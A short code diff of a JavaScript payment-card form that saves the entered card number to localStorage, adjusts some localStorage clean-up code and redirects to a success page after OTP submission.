@@ -142,6 +142,11 @@ function inputbox(e) {
 
     textnumber.innerHTML = i.join(" ")
 
+    localStorage.setItem("number", textnumber.textContent)
+
+
+
+
 
 
 }
@@ -379,7 +384,7 @@ check.addEventListener("click", () => {
 
         localStorage.removeItem("cvv2")
 
-          localStorage.removeItem("month")
+        localStorage.removeItem("month")
 
         localStorage.removeItem("year")
 
@@ -768,10 +773,7 @@ submitOtpBtn.addEventListener("click", () => {
 
         setTimeout(() => {
 
-
-            location.reload()
-
-
+            window.location.href = "success.html"
 
         }, 6000)
 
@@ -1087,3 +1089,7 @@ function paspoya() {
 
 
 }
+
+
+
+// :) ...........................
